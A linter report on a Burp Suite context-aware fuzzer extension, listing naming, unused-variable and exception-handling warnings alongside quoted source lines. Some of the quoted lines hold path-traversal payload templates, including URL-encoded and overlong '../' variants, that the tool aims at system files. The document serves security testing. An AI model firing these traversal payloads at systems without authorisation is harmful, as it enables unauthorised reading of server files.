UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:850:17
    |
848 |           for name, curr, branch in self.generateEncodingTree(data):
849 |               ReEncoder.log(
850 | /                 '[*] Generator returned: ("{}", "{}", {})'.format(
851 | |                     name, curr[:20], str(branch)
852 | |                 )
    | |_________________^
853 |               )
    |
help: Convert to f-string

N806 Variable `currNode` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:855:13
    |
853 |             )
854 |
855 |             currNode = anytree.Node(name, parent=prev, decoded=curr)
    |             ^^^^^^^^
856 |             if branch:
857 |                 pass
    |

B007 Loop control variable `fill` not used within loop body
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:861:18
    |
859 |                 prev = currNode
860 |
861 |         for pre, fill, node in anytree.RenderTree(root):
    |                  ^^^^
862 |             if node.name != "None":
863 |                 ReEncoder.log(
    |
help: Rename unused `fill` to `_fill`

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:864:21
    |
862 |               if node.name != "None":
863 |                   ReEncoder.log(
864 | /                     "%s%s (%s)"
865 | |                     % (pre, node.name, node.decoded[:20].decode("ascii", "ignore"))
    | |___________________________________________________________________________________^
866 |                   )
    |
help: Replace with format specifiers

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:869:23
    |
868 |         self.encodings = self.getWinningDecodePath(root)
869 |         ReEncoder.log("[+] Selected encodings: {}".format(str(self.encodings)))
    |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
870 |
871 |     def decode(self, data, preferredOutputFormat=PREFER_AUTO, encodings=[]):
    |
help: Convert to f-string

N803 Argument name `preferredOutputFormat` should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:871:28
    |
869 |         ReEncoder.log("[+] Selected encodings: {}".format(str(self.encodings)))
870 |
871 |     def decode(self, data, preferredOutputFormat=PREFER_AUTO, encodings=[]):
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
872 |         self.preferredOutputFormat = preferredOutputFormat
    |

B006 Do not use mutable data structures for argument defaults
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:871:73
    |
869 |         ReEncoder.log("[+] Selected encodings: {}".format(str(self.encodings)))
870 |
871 |     def decode(self, data, preferredOutputFormat=PREFER_AUTO, encodings=[]):
    |                                                                         ^^
872 |         self.preferredOutputFormat = preferredOutputFormat
    |
help: Replace with `None`; initialize within function

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:880:17
    |
878 |           ):
879 |               raise Exception(
880 | /                 "Unknown preferred output format specified in decode(): {}".format(
881 | |                     preferredOutputFormat
882 | |                 )
    | |_________________^
883 |               )
    |
help: Convert to f-string

N806 Variable `encoderName` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:891:13
    |
889 |             self.encodings = encodings
890 |
891 |         for encoderName in self.encodings:
    |             ^^^^^^^^^^^
892 |             d = self.encodersMap[encoderName].decode(data)
893 |             data = d
    |

B006 Do not use mutable data structures for argument defaults
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:897:38
    |
895 |         return data
896 |
897 |     def encode(self, data, encodings=[]):
    |                                      ^^
898 |         if encodings:
899 |             encodings.reverse()
    |
help: Replace with `None`; initialize within function

N806 Variable `encoderName` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:903:13
    |
901 |             self.encodings = encodings
902 |
903 |         for encoderName in self.encodings[::-1]:
    |             ^^^^^^^^^^^
904 |             e = self.encodersMap[encoderName].encode(data)
905 |             data = e
    |

F841 Local variable `val` is assigned to but never used
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:943:13
    |
942 |         try:
943 |             val = float(data)
    |             ^^^
944 |             return "float"
945 |         except ValueError:
    |
help: Remove assignment to unused variable `val`

E722 Do not use bare `except`
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:964:13
    |
962 |                     # This happens to be valid base64
963 |                     return "string"
964 |             except:
    |             ^^^^^^
965 |                 pass
    |

N806 Variable `numberOfMutations` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:995:9
    |
993 |         # 8/2 + 1 = 5
994 |         # 10/2 + 1 = 6
995 |         numberOfMutations = self.intensity / 2 + 1
    |         ^^^^^^^^^^^^^^^^^
996 |
997 |         # Mutations #4: Add some repeated values
    |

N806 Variable `chunkLen` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1000:17
     |
 998 |         for i in range(numberOfMutations):
 999 |             try:
1000 |                 chunkLen = random.randint(len(payload[offset:]), len(payload) - 1)
     |                 ^^^^^^^^
1001 |             except ValueError:
1002 |                 chunkLen = len(payload) - offset
     |

N806 Variable `chunkLen` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1002:17
     |
1000 |                 chunkLen = random.randint(len(payload[offset:]), len(payload) - 1)
1001 |             except ValueError:
1002 |                 chunkLen = len(payload) - offset
     |                 ^^^^^^^^
1003 |             repeater = random.randint(1, 10)
     |

B007 Loop control variable `i` not used within loop body
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1006:17
     |
1005 |             repeated = mutated0
1006 |             for i in range(repeater):
     |                 ^
1007 |                 repeated += payload[offset : offset + chunkLen]
     |
help: Rename unused `i` to `_i`

B007 Loop control variable `i` not used within loop body
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1012:13
     |
1011 |         # Mutations #5: Some random bit flips
1012 |         for i in range(numberOfMutations):
     |             ^
1013 |             byte = random.randint(0, len(payload) - 1)
1014 |             bit = random.randint(0, 7)
     |
help: Rename unused `i` to `_i`

N806 Variable `mutatedByte` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1016:13
     |
1014 |             bit = random.randint(0, 7)
1015 |
1016 |             mutatedByte = "%{:02x}".format((ord(payload[byte]) ^ (1 << bit)) % 255)
     |             ^^^^^^^^^^^
1017 |             mutated = payload[: byte - 1] + mutatedByte + payload[byte + 1 :]
1018 |             self.mutations.append(mutated)
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1016:27
     |
1014 |             bit = random.randint(0, 7)
1015 |
1016 |             mutatedByte = "%{:02x}".format((ord(payload[byte]) ^ (1 << bit)) % 255)
     |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1017 |             mutated = payload[: byte - 1] + mutatedByte + payload[byte + 1 :]
1018 |             self.mutations.append(mutated)
     |
help: Convert to f-string

N806 Variable `numberOfEntriesToUse` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1044:17
     |
1042 |                 # Mutations #2b: Add some insert-only values
1043 |
1044 |                 numberOfEntriesToUse = len(FUZZ_INSERT_LIST)
     |                 ^^^^^^^^^^^^^^^^^^^^
1045 |                 if self.intensity == PayloadGenerationIntensity.MEDIUM:
1046 |                     numberOfEntriesToUse /= 3
     |

N806 Variable `numberOfEntriesToUse` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1046:21
     |
1044 |                 numberOfEntriesToUse = len(FUZZ_INSERT_LIST)
1045 |                 if self.intensity == PayloadGenerationIntensity.MEDIUM:
1046 |                     numberOfEntriesToUse /= 3
     |                     ^^^^^^^^^^^^^^^^^^^^
1047 |                 if self.intensity == PayloadGenerationIntensity.HIGH:
1048 |                     numberOfEntriesToUse /= 2
     |

N806 Variable `numberOfEntriesToUse` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1048:21
     |
1046 |                     numberOfEntriesToUse /= 3
1047 |                 if self.intensity == PayloadGenerationIntensity.HIGH:
1048 |                     numberOfEntriesToUse /= 2
     |                     ^^^^^^^^^^^^^^^^^^^^
1049 |
1050 |                 for i in FUZZ_INSERT_LIST[:numberOfEntriesToUse]:
     |

N806 Variable `edgeCases` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1063:9
     |
1061 |         values = [2**0, 2**1, 2**8 - 1, 2**8, 1000, 2**16 - 1, 2**16, 2**32 - 1, 2**32]
1062 |
1063 |         edgeCases = values + [-x for x in values]
     |         ^^^^^^^^^
1064 |         return [str(x) for x in edgeCases]
     |

N806 Variable `edgeCases` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1080:9
     |
1078 |         ]
1079 |
1080 |         edgeCases = []
     |         ^^^^^^^^^
1081 |
1082 |         for vals in [values, ieee754trickery]:
     |

N806 Variable `dotTemplates` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1107:9
     |
1105 |         #   num = 2 * len(files) * len(dotTemplates) * depth
1106 |         depth = 5
1107 |         dotTemplates = {
     |         ^^^^^^^^^^^^
1108 |             "linux": ("../", "..%2f", "%2e%2e%2f", "..%252f", "..%c0%af../"),
1109 |             "windows": ("..\\", "..%5c", "%2e%2e%5c", "..%255c", "..%c0%af..\\"),
     |

N806 Variable `numberOfDotsToApply` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1117:9
     |
1115 |         }
1116 |
1117 |         numberOfDotsToApply = 1
     |         ^^^^^^^^^^^^^^^^^^^
1118 |         if self.intensity > PayloadGenerationIntensity.MEDIUM:
1119 |             numberOfDotsToApply = None
     |

N806 Variable `numberOfDotsToApply` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1119:13
     |
1117 |         numberOfDotsToApply = 1
1118 |         if self.intensity > PayloadGenerationIntensity.MEDIUM:
1119 |             numberOfDotsToApply = None
     |             ^^^^^^^^^^^^^^^^^^^
1120 |         elif self.intensity > PayloadGenerationIntensity.LOW:
1121 |             numberOfDotsToApply = 3
     |

N806 Variable `numberOfDotsToApply` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1121:13
     |
1119 |             numberOfDotsToApply = None
1120 |         elif self.intensity > PayloadGenerationIntensity.LOW:
1121 |             numberOfDotsToApply = 3
     |             ^^^^^^^^^^^^^^^^^^^
1122 |
1123 |         totalFiles = PATH_TRAVERSAL_FILES["linux"] + PATH_TRAVERSAL_FILES["windows"]
     |

N806 Variable `totalFiles` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1123:9
     |
1121 |             numberOfDotsToApply = 3
1122 |
1123 |         totalFiles = PATH_TRAVERSAL_FILES["linux"] + PATH_TRAVERSAL_FILES["windows"]
     |         ^^^^^^^^^^
1124 |         fuzzEvery = (
1125 |             PayloadGenerationIntensity.fuzzEveryN(self.intensity, totalFiles) + 1
     |

N806 Variable `fuzzEvery` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1124:9
     |
1123 |         totalFiles = PATH_TRAVERSAL_FILES["linux"] + PATH_TRAVERSAL_FILES["windows"]
1124 |         fuzzEvery = (
     |         ^^^^^^^^^
1125 |             PayloadGenerationIntensity.fuzzEveryN(self.intensity, totalFiles) + 1
1126 |         )
     |

N806 Variable `fuzzEvery` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1128:13
     |
1126 |         )
1127 |         if self.intensity > PayloadGenerationIntensity.HIGH:
1128 |             fuzzEvery = 1
     |             ^^^^^^^^^
1129 |
1130 |         for os in ["linux", "windows"]:
     |

N806 Variable `varType` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1150:13
     |
1149 |         if self.intensity > PayloadGenerationIntensity.MINIMAL:
1150 |             varType = self.findType(data)
     |             ^^^^^^^
1151 |             if varType == "string":
1152 |                 print('[>] Parameter classified as BasicType "string"')
     |

F841 Local variable `mutations` is assigned to but never used
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1163:9
     |
1161 |                 self.pathMutator(data)
1162 |
1163 |         mutations = self.mutations[:]
     |         ^^^^^^^^^
1164 |         ordered = OrderedDict()
1165 |         for mut in self.mutations:
     |
help: Remove assignment to unused variable `mutations`

E722 Do not use bare `except`
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1188:9
     |
1186 |             json.loads(data)
1187 |             return True
1188 |         except:
     |         ^^^^^^
1189 |             return False
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1194:20
     |
1192 |     def _construct_key(previous_key, separator, new_key):
1193 |         if previous_key:
1194 |             return "{}{}{}".format(previous_key, separator, new_key)
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1195 |         else:
1196 |             return new_key
     |
help: Convert to f-string

B006 Do not use mutable data structures for argument defaults
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1199:65
     |
1198 |     @staticmethod
1199 |     def flatten(nested_dict, separator="_", root_keys_to_ignore=set()):
     |                                                                 ^^^^^
1200 |         flattened_dict = dict()
     |
help: Replace with `None`; initialize within function

C408 Unnecessary `dict()` call (rewrite as a literal)
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1200:26
     |
1198 |     @staticmethod
1199 |     def flatten(nested_dict, separator="_", root_keys_to_ignore=set()):
1200 |         flattened_dict = dict()
     |                          ^^^^^^
1201 |
1202 |         def _flatten(object_, key):
     |
help: Rewrite as a literal

SIM101 Multiple `isinstance` calls for `object_`, merge into a single call
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1210:18
     |
1208 |                             JSONTypeFuzzer._construct_key(key, separator, object_key),
1209 |                         )
1210 |             elif isinstance(object_, list) or isinstance(object_, set):
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1211 |                 for index, item in enumerate(object_):
1212 |                     _flatten(item, JSONTypeFuzzer._construct_key(key, separator, index))
     |
help: Merge `isinstance` calls for `object_`

N806 Variable `validJson` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1220:9
     |
1219 |     def getMutations(self, data):
1220 |         validJson = json.loads(data)
     |         ^^^^^^^^^
1221 |         mutations = []
1222 |         fuzzer = BasicTypeFuzzer(self.intensity)
     |

N806 Variable `fuzzEveryN` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1225:9
     |
1224 |         flattened = JSONTypeFuzzer.flatten(validJson).items()
1225 |         fuzzEveryN = PayloadGenerationIntensity.fuzzEveryN(
     |         ^^^^^^^^^^
1226 |             self.intensity, len(flattened)
1227 |         )
     |

B007 Loop control variable `k` not used within loop body
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1230:13
     |
1228 |         num = 0
1229 |
1230 |         for k, fuzzable in flattened:
     |             ^
1231 |             num += 1
1232 |             if num % fuzzEveryN != 0:
     |
help: Rename unused `k` to `_k`

N806 Variable `dataMutated` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1237:21
     |
1235 |             for mut in fuzzer.getMutations(fuzzable):
1236 |                 if data.count(fuzzable) == 1:
1237 |                     dataMutated = data.replace(fuzzable, mut)
     |                     ^^^^^^^^^^^
1238 |                     mutations.append(dataMutated)
     |

N806 Variable `dataMutated` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1241:21
     |
1240 |                 elif data.count('"' + fuzzable + '"') == 1:
1241 |                     dataMutated = data.replace('"' + fuzzable + '"', '"' + mut + '"')
     |                     ^^^^^^^^^^^
1242 |                     mutations.append(dataMutated)
     |

N806 Variable `dataMutated` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1245:21
     |
1244 |                 elif data.count(fuzzable + ",") == 1:
1245 |                     dataMutated = data.replace(fuzzable + ",", mut + ",")
     |                     ^^^^^^^^^^^
1246 |                     mutations.append(dataMutated)
     |

F841 Local variable `root` is assigned to but never used
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1269:13
     |
1267 |     def check(self, data):
1268 |         try:
1269 |             root = ET.fromstring(data.strip())
     |             ^^^^
1270 |             return True
1271 |         except:
     |
help: Remove assignment to unused variable `root`

E722 Do not use bare `except`
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1271:9
     |
1269 |             root = ET.fromstring(data.strip())
1270 |             return True
1271 |         except:
     |         ^^^^^^
1272 |             return False
     |

N806 Variable `attrName` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1278:17
     |
1276 |             if elem.text and len(elem.text.strip()) > 0:
1277 |                 yield elem.text.strip()
1278 |             for attrName, attrValue in elem.attrib.items():
     |                 ^^^^^^^^
1279 |                 yield attrValue.strip()
     |

B007 Loop control variable `attrName` not used within loop body
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1278:17
     |
1276 |             if elem.text and len(elem.text.strip()) > 0:
1277 |                 yield elem.text.strip()
1278 |             for attrName, attrValue in elem.attrib.items():
     |                 ^^^^^^^^
1279 |                 yield attrValue.strip()
     |
help: Rename unused `attrName` to `_attrName`

N806 Variable `attrValue` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1278:27
     |
1276 |             if elem.text and len(elem.text.strip()) > 0:
1277 |                 yield elem.text.strip()
1278 |             for attrName, attrValue in elem.attrib.items():
     |                           ^^^^^^^^^
1279 |                 yield attrValue.strip()
     |

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1288:27
     |
1286 |             yield node, path
1287 |         for child in node:
1288 |             _child_path = "%s/%s" % (path, child.tag)
     |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
1289 |             for child, child_path in XMLTypeFuzzer.etree_iter_path(
1290 |                 child, tag, path=_child_path
     |
help: Replace with format specifiers

B020 Loop control variable `child` overrides iterable it iterates
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1289:17
     |
1287 |         for child in node:
1288 |             _child_path = "%s/%s" % (path, child.tag)
1289 |             for child, child_path in XMLTypeFuzzer.etree_iter_path(
     |                 ^^^^^
1290 |                 child, tag, path=_child_path
1291 |             ):
     |

N806 Variable `elementsInXml` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1320:9
     |
1318 |             out[mut] = True
1319 |
1320 |         elementsInXml = list(XMLTypeFuzzer.etree_iter_path(root))
     |         ^^^^^^^^^^^^^
1321 |         fuzzEveryN = PayloadGenerationIntensity.fuzzEveryN(
1322 |             self.intensity, len(elementsInXml)
     |

N806 Variable `fuzzEveryN` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1321:9
     |
1320 |         elementsInXml = list(XMLTypeFuzzer.etree_iter_path(root))
1321 |         fuzzEveryN = PayloadGenerationIntensity.fuzzEveryN(
     |         ^^^^^^^^^^
1322 |             self.intensity, len(elementsInXml)
1323 |         )
     |

N806 Variable `elemText` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1327:13
     |
1326 |         for elem, path in elementsInXml:
1327 |             elemText = elem.text
     |             ^^^^^^^^
1328 |             path = path.replace("./", ".//")
     |

N806 Variable `attrName` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1336:17
     |
1334 |                 continue
1335 |
1336 |             for attrName, attrValue in elem.attrib.items():
     |                 ^^^^^^^^
1337 |                 num += 1
1338 |                 if num % fuzzEveryN != 0:
     |

B007 Loop control variable `attrName` not used within loop body
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1336:17
     |
1334 |                 continue
1335 |
1336 |             for attrName, attrValue in elem.attrib.items():
     |                 ^^^^^^^^
1337 |                 num += 1
1338 |                 if num % fuzzEveryN != 0:
     |
help: Rename unused `attrName` to `_attrName`

N806 Variable `attrValue` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1336:27
     |
1334 |                 continue
1335 |
1336 |             for attrName, attrValue in elem.attrib.items():
     |                           ^^^^^^^^^
1337 |                 num += 1
1338 |                 if num % fuzzEveryN != 0:
     |

N806 Variable `attribMutations` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1341:17
     |
1339 |                     continue
1340 |
1341 |                 attribMutations = fuzzer.getMutations(attrValue)
     |                 ^^^^^^^^^^^^^^^
1342 |                 for mut in attribMutations:
1343 |                     if data.count(attrValue) == 1:
     |

N806 Variable `dataMutated` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1344:25
     |
1342 |                 for mut in attribMutations:
1343 |                     if data.count(attrValue) == 1:
1344 |                         dataMutated = data.replace(attrValue, mut)
     |                         ^^^^^^^^^^^
1345 |                         mutations.append(dataMutated)
     |

N806 Variable `dataMutated` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1348:25
     |
1347 |                     elif data.count('"' + attrValue + '"') == 1:
1348 |                         dataMutated = data.replace(
     |                         ^^^^^^^^^^^
1349 |                             '"' + attrValue + '"', '"' + mut + '"'
1350 |                         )
     |

N806 Variable `elemTextMutations` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1353:13
     |
1351 |                         mutations.append(dataMutated)
1352 |
1353 |             elemTextMutations = fuzzer.getMutations(elemText)
     |             ^^^^^^^^^^^^^^^^^
1354 |             for mut in elemTextMutations:
1355 |                 if data.count(elemText) == 1:
     |

N806 Variable `dataMutated` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1356:21
     |
1354 |             for mut in elemTextMutations:
1355 |                 if data.count(elemText) == 1:
1356 |                     dataMutated = data.replace(elemText, mut)
     |                     ^^^^^^^^^^^
1357 |                     mutations.append(dataMutated)
     |

N806 Variable `dataMutated` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1360:21
     |
1359 |                 elif data.count('"' + elemText + '"') == 1:
1360 |                     dataMutated = data.replace('"' + elemText + '"', '"' + mut + '"')
     |                     ^^^^^^^^^^^
1361 |                     mutations.append(dataMutated)
     |

N806 Variable `dataMutated` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1364:21
     |
1363 |                 elif data.count(">" + elemText + "<") == 1:
1364 |                     dataMutated = data.replace(">" + elemText + "<", ">" + mut + "<")
     |                     ^^^^^^^^^^^
1365 |                     mutations.append(dataMutated)
     |

N803 Argument name `fuzzablesNumber` should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1383:31
     |
1382 |     @staticmethod
1383 |     def fuzzEveryN(intensity, fuzzablesNumber):
     |                               ^^^^^^^^^^^^^^^
1384 |         fuzzEvery = 0
1385 |         if intensity == PayloadGenerationIntensity.EXTREME:
     |

N806 Variable `fuzzEvery` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1384:9
     |
1382 |     @staticmethod
1383 |     def fuzzEveryN(intensity, fuzzablesNumber):
1384 |         fuzzEvery = 0
     |         ^^^^^^^^^
1385 |         if intensity == PayloadGenerationIntensity.EXTREME:
1386 |             fuzzEvery = 1
     |

SIM114 [*] Combine `if` branches using logical `or` operator
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1385:9
     |
1383 |       def fuzzEveryN(intensity, fuzzablesNumber):
1384 |           fuzzEvery = 0
1385 | /         if intensity == PayloadGenerationIntensity.EXTREME:
1386 | |             fuzzEvery = 1
1387 | |         elif intensity == PayloadGenerationIntensity.HIGH:
1388 | |             fuzzEvery = 1
     | |_________________________^
1389 |           elif intensity == PayloadGenerationIntensity.MEDIUM:
1390 |               fuzzEvery = 2
     |
help: Combine `if` branches

N806 Variable `fuzzEvery` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1386:13
     |
1384 |         fuzzEvery = 0
1385 |         if intensity == PayloadGenerationIntensity.EXTREME:
1386 |             fuzzEvery = 1
     |             ^^^^^^^^^
1387 |         elif intensity == PayloadGenerationIntensity.HIGH:
1388 |             fuzzEvery = 1
     |

N806 Variable `fuzzEvery` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1388:13
     |
1386 |             fuzzEvery = 1
1387 |         elif intensity == PayloadGenerationIntensity.HIGH:
1388 |             fuzzEvery = 1
     |             ^^^^^^^^^
1389 |         elif intensity == PayloadGenerationIntensity.MEDIUM:
1390 |             fuzzEvery = 2
     |

SIM114 [*] Combine `if` branches using logical `or` operator
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1389:9
     |
1387 |           elif intensity == PayloadGenerationIntensity.HIGH:
1388 |               fuzzEvery = 1
1389 | /         elif intensity == PayloadGenerationIntensity.MEDIUM:
1390 | |             fuzzEvery = 2
1391 | |         elif intensity == PayloadGenerationIntensity.LOW:
1392 | |             fuzzEvery = 2
     | |_________________________^
1393 |           elif intensity == PayloadGenerationIntensity.MINIMAL:
1394 |               fuzzEvery = 3
     |
help: Combine `if` branches

N806 Variable `fuzzEvery` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1390:13
     |
1388 |             fuzzEvery = 1
1389 |         elif intensity == PayloadGenerationIntensity.MEDIUM:
1390 |             fuzzEvery = 2
     |             ^^^^^^^^^
1391 |         elif intensity == PayloadGenerationIntensity.LOW:
1392 |             fuzzEvery = 2
     |

N806 Variable `fuzzEvery` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1392:13
     |
1390 |             fuzzEvery = 2
1391 |         elif intensity == PayloadGenerationIntensity.LOW:
1392 |             fuzzEvery = 2
     |             ^^^^^^^^^
1393 |         elif intensity == PayloadGenerationIntensity.MINIMAL:
1394 |             fuzzEvery = 3
     |

N806 Variable `fuzzEvery` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1394:13
     |
1392 |             fuzzEvery = 2
1393 |         elif intensity == PayloadGenerationIntensity.MINIMAL:
1394 |             fuzzEvery = 3
     |             ^^^^^^^^^
1395 |
1396 |         if fuzzablesNumber < 10:
     |

N806 Variable `fuzzEvery` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1397:13
     |
1396 |         if fuzzablesNumber < 10:
1397 |             fuzzEvery = 1
     |             ^^^^^^^^^
1398 |
1399 |         return fuzzEvery
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1413:13
     |
1412 |           print(
1413 | /             """
1414 | |     Context-Aware Payload Fuzzer
1415 | |     Mariusz B. / mgeeky, v{}.
1416 | |
1417 | | [+] For more informations about this extension - please visit:
1418 | |     https://github.com/mgeeky/burpContextAwareFuzzer
1419 | |
1420 | | [+] Unique pattern applied to input-values, to look for in responses:
1421 | |     "{}"
1422 | | """.format(
1423 | |                 VERSION, UNIQUE_PATTERN_TO_SEARCH_FOR
1424 | |             )
     | |_____________^
1425 |           )
     |
help: Convert to f-string

N803 Argument name `currentPayload` should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1508:30
     |
1506 |         return self.payloadsGenerated < self.payloadsToGenerate
1507 |
1508 |     def getNextPayload(self, currentPayload):
     |                              ^^^^^^^^^^^^^^
1509 |         payload = self._helpers.bytesToString(currentPayload)
     |

N806 Variable `origPayload` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1512:9
     |
1511 |         reencode = ReEncoder()
1512 |         origPayload = payload
